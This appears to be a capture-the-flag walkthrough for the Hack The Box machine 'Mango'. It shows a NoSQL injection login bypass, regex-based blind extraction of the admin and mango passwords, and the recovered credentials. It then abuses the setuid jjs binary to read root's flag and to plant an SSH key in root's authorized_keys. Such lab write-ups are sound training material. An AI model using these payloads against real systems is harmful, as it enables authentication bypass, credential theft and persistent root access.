@@ -1,0 +1,138 @@
+User Shell:
+
+Nmap and modified /etc/hosts file.
+( add stagin-order.mango.htb as 10.10.10.162 )
+root@kali:~/Desktop/htb/mango# cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	kali
+10.10.10.110 gogs.craft.htb
+10.10.10.110 api.craft.htb
+10.10.10.159 docker.registry.htb
+10.10.10.162 staging-order.mango.htb
+
+
+After found a login page at http://staging-order.mango.htb/index.php
+search mango database you'll find a big hint is the box using "mongo db"
+Which is a NOSQL db.
+
+And we found a article at github:
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
+
+and we using burp to test if this site is vulns ,
+send the request as post below:
+----------------------------------------------------------------------------------
+POST /index.php HTTP/1.1							 -
+Host: staging-order.mango.htb							 -
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 -
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8		 -
+Accept-Language: en-US,en;q=0.5							 -
+Accept-Encoding: gzip, deflate							 -
+Referer: http://staging-order.mango.htb/index.php				 -
+Content-Type: application/x-www-form-urlencoded					 -
+Content-Length: 49								 -
+Cookie: PHPSESSID=9kmgv6e1qu3fivcnuc52kj5ipq					 -
+Connection: close								 -
+Upgrade-Insecure-Requests: 1							 -
+										 -
+username[$ne]=test&password[$ne]=test&login=login				 -
+----------------------------------------------------------------------------------
+
+And the response shows the HTTP/1.1 302 Found !
+GUESSING USER:
+Now we could guess the username length :
+username[$regex]=.{1}&password[$ne]=test&login=login
+response 302 untill 6 ( didn't redirect )
+username[$regex]=.{6}&password[$ne]=test&login=login
+
+username length = 5 chars
+
+now try to guess the username :
+username[$regex]=a.{4}&password[$ne]=test&login=login
+~
+username[$regex]=admin.{0}&password[$ne]=test&login=login
+
+username = admin ( actually there's another user )
+
+
+GUESSING PASSWORD:
+Now time for passwd:
+username=admin&password[$regex]=.{12}&login=login
+13 got 200 OK ( no redirect )
+
+admin's password length = 12
+
+
+it's going forever ........
+
+We can use burp Intruder :D
+Example for admin password
+1. At Repeater press ctrl + i
+2. Clear§
+3. .{12} into §§.{11}
+4. Download char wordlist at https://github.com/xmendez/wfuzz/blob/master/wordlist/stress/alphanum_case_extra.txt
+5. Click "start attack"
+6. See if it returns 302 , Remember, some regex will also return 302
+
+In the end we found two creds:
+admin:t9KcS3>!0B#2
+mango:h3mXK8RhU~f{]f5H
+
+login as mango ssh
+> ssh mango@10.10.10.162
+
+Then, it seems there's no ssh key on server
+And we found out that userflag is at /home/admin
+so we su the user
+> su - admin
+> enter password
+
+u r admin now :D !
+
+==================================================================================
+
+Root Shell:
+
+enum with lse.sh as admin
+found at that:
+
+[!] fst020 Uncommon setuid binaries........................................ yes!
+---
+/usr/bin/run-mailcap
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+
+Now it's to gtfobin !
+jjs : https://gtfobins.github.io/gtfobins/jjs/#reverse-shell
+
+bash to cat userflag:
+
+echo 'var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+while ((line = br.readLine()) != null) { print(line); }' | jjs
+
+
+
+Further More:
+Getting a Root shell:
+> ssh-keygen -f mango_root
+> chmod 600 mango_root
+> cat mango_root.pub copy that string to server:
+echo 'var FileWriter = Java.type("java.io.FileWriter");
+var fw=new FileWriter("/root/.ssh/authorized_keys", true);
+fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDefKAPJgh8mjIc/UaVwdM1npgIkAOj5UReBIc5suXwPkldXJP1pWtSWQTF2e/8uwZHN0Hm8ygKY6+i62HLjuE9wBMUHPUXarqJjF7hZG+yiMqFRLRv8AnsnqSqM2VVBiZ99Bs6+mEJoLWFIZf5NO6x1xtO18HoQAi29thkv0XjZUngZeksQSl+O/JASTEPodqyepX9IIX6/hixRBk8FFZ5oA3Poj6AzE5ylLeH5iFQ7H092gDJOIDr2EPWR8aE3IP4d7Ug8fXGn0kspi1WUE6FK9tgiJtNtgiTSJaMjTyo7BwHKvyA11RSKQhfTUZJEUu6bQKn8aaalMRbOE+LZp2PmNJa44NBDvox93FgQuTro5EqzOsgtyIYndwYLTXTmeQQTOgfPm7M4J9guN2vnwG2uL5Y+j0NWkjpiwJKlhtO0QnDNICF9BKugpsehNLCggmyA7c1m0dZ0qWZ4e1ORFwtvOMbG4kD1u7rRga/DRkvc8Ufz0r9Bk6iq6tXHWtULiU=");
+fw.close();' | jjs
+
+> ssh -i mango_root root@10.10.10.162
+
+done !
+
+
+
+
+
+
+
+
+
+
+
